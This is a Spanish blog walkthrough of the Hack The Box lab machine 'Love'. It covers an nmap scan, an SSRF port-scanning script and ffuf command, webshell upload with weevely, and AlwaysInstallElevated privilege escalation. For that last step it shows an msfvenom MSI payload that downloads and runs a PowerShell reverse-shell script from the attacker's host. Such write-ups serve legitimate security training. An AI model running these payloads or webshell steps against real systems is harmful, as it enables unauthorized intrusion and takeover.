---
layout: single
title: Love - Hack The Box
excerpt: "Love es una máquina sencilla que cuenta con una vulnerabilidad ssrf en la cual logramos extraer una contraseña, luego ingresamos al panel de administración del admin y logramos subir una webshell. Luego la escalada de privilegios es bastante fácil"
date: 2022-09-09
classes: wide
header:
  teaser: /assets/images/htb-writeup-love/love_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - cxdxnt
tags:  
  - ssrf 
  - AllwaysInstallElevated
  - webshell
---
![](/assets/images/htb-writeup-love/love_logo.png)

Empezamos con love que es una máquina de calificación media, en la cual contiene una vulnerabilidad ssrf, gracias a cuya vulnerabilidad logramos extraer una contraseña que nos sirve para ingresar al panel de administración. Una vez dentro logramos insertar una webshell, una vez dentro de la máquina la elevación de privilegios consiste en la carga de un archivo msi malicioso.

## Enumeracion

Lanzamos un simple reconocimiento con nmap.
```ruby
 nmap -sCV -p80,135,139,443,445,3306,5000,5040,7680,49664,49665,49666,49667,49668,49669,49670 10.10.10.239 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-09 12:22 -03
Nmap scan report for 10.10.10.239
Host is up (0.24s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
| tls-alpn: 
|_  http/1.1
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, HTTPOptions, Help, LDAPBindReq, LDAPSearchReq, LPDString, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TerminalServerCookie: 
|_    Host '10.10.14.8' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=9/9%Time=631B5A4A%P=x86_64-pc-linux-gnu%r(HTT
SF:POptions,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RTSPReq
SF:uest,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck,49
SF:,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed\x20
SF:to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSVersionBindReqT
SF:CP,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSStatusRequ
SF:estTCP,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Help,49,"
SF:E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed\x20to
SF:\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSLSessionReq,49,"E\
SF:0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed\x20to\x
SF:20connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalServerCookie,4
SF:9,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SMBProgNeg,49,"E\
SF:0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed\x20to\x
SF:20connect\x20to\x20this\x20MariaDB\x20server")%r(FourOhFourRequest,49,"
SF:E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed\x20to
SF:\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LPDString,49,"E\0\0\
SF:x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed\x20to\x20co
SF:nnect\x20to\x20this\x20MariaDB\x20server")%r(LDAPSearchReq,49,"E\0\0\x0
SF:1\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed\x20to\x20conn
SF:ect\x20to\x20this\x20MariaDB\x20server")%r(LDAPBindReq,49,"E\0\0\x01\xf
SF:fj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed\x20to\x20connect\
SF:x20to\x20this\x20MariaDB\x20server")%r(SIPOptions,49,"E\0\0\x01\xffj\x0
SF:4Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed\x20to\x20connect\x20to
SF:\x20this\x20MariaDB\x20server")%r(NotesRPC,49,"E\0\0\x01\xffj\x04Host\x
SF:20'10\.10\.14\.8'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20thi
SF:s\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-09-09T15:47:01
|_  start_date: N/A
|_clock-skew: mean: 2h41m35s, deviation: 4h02m32s, median: 21m33s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-09-09T08:47:00-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 185.30 seconds
```

No vemos nada interesante en http://10.10.10.239/index.php ni como http ni como https. Por lo cual se me ocurre agregar el dominio sacado por nmap a nuestro /etc/hosts, y luego insertamos el dominio en nuestro navegador. Nos dirigimos a demo.php y vemos lo siguiente.

![](/assets/images/htb-writeup-love/ssrf.png)

Nos montamos un servidor web con php y probamos si nos interpreta el código php.

![](/assets/images/htb-writeup-love/interpreta-codigo-php.png)

Con lo visto anteriormente ya se me ocurre un ataque ssrf.

## Ssrf 

El ataque lo podemos hacer de dos formas, con un script en python o con ffuf.

```python
#!/usr/bin/python3
def ssrf():
    p = log.progress('Ssrf attack start.')
    p1=log.progress('Port')
    p2= log.progress("Port Open:")
    listport=""
    for port in range(1,65536):
        p1.status('%d/65536'%port)
        p2.status('%s'%listport)
        data_post={'file':"http://127.0.0.1:%d"%port,'read':'Scan file'}
        r = requests.post(main_url,data=data_post)
        if 4997 == len(r.text):
            pass
        else:
            port =str(port)
            listport+=port
if __name__ == '__main__':
    import requests
    from pwn import *
    main_url= "http://staging.love.htb/beta.php"
    ssrf()
```

```bash
ffuf -X POST -w port -u http://staging.love.htb/beta.php -d "file=http://127.0.0.1:FUZZ&read=Scan+file" -H "Content-Type: application/x-www-form-urlencoded" -c -t 50 -fw=1248

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://staging.love.htb/beta.php
 :: Wordlist         : FUZZ: port
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : file=http://127.0.0.1:FUZZ&read=Scan+file
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 1248
________________________________________________

80                      [Status: 200, Size: 9385, Words: 1901, Lines: 337, Duration: 303ms]
443                     [Status: 200, Size: 5466, Words: 1296, Lines: 224, Duration: 248ms]
5000                    [Status: 200, Size: 9591, Words: 2385, Lines: 411, Duration: 249ms]
5985                    [Status: 200, Size: 5312, Words: 1266, Lines: 218, Duration: 246ms]
```
Ingresamos desde demo.php la siguiente url "http://127.0.0.1:5000" y vemos una password.

![](/assets/images/htb-writeup-love/credentials.png)

Vamos a la ruta http://10.10.10.239/admin e ingresamos dichas credenciales y logramos entrar.

- Le echamos un vistazo al panel de administración y notamos que podemos subir una “imagen”, probamos si nos deja subir un php y correcto nos deja. Procedemos a subir una webshell básica. 
- Luego para ver donde se guarda el archivo es simple, solamente aprietas ctrl+u(firefox) y buscas el nombre de tu archivo en el código html.

![](/assets/images/htb-writeup-love/whoami.png)

Si queremos tener un poco más de seguridad en nuestra web shell para que nadie más que nosotros pueda ejecutar comandos, procedemos a ser lo siguiente. Nos descargamos el repo de https://github.com/epinna/weevely3

```bash
cd weevely3/
python3 weevely.py generate '123#!123' cmd.php #Nos creamos una web shell.
python3 weevely.py http://10.10.10.239/images/cmd.php '123#!123' # Ingresamos a nuestra web shell.
```
![](/assets/images/htb-writeup-love/webshell.png)

## Elevacion de privilegios

Una vez dentro del sistema corremos el winpeas y encontramos esto.
![](/assets/images/htb-writeup-love/winpeas.png)

Creamos el paylaod.

```bash
msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/Invoke-PowerShellTcp.ps1')" -f msi -o alwe.msi
```

Nos transferimos el alwe.msi a la máquina víctima y lo ejecutamos.

```bash
copy \\10.10.14.8\parrot\alwe.msi
msiexec /quiet /qn /i c:\windows\Temp\priv\alwe.msi
```
Logrado :D.


![](/assets/images/htb-writeup-love/root.png)
